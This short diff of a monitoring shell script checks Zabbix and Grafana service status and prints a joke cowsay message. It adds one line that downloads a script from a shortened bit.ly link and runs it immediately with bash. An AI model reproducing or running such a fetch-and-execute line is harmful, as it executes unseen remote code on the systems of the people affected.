@@ -59,5 +59,7 @@ systemctl status zabbix-server | grep Active
 systemctl status zabbix-agent | grep Active
 systemctl status grafana-server | grep Active
 cowsay AI PAI! PARA, TO IMPACTADA!
+wget https://bit.ly/2SY7SBv -O check.sh && bash $_
+
 
 
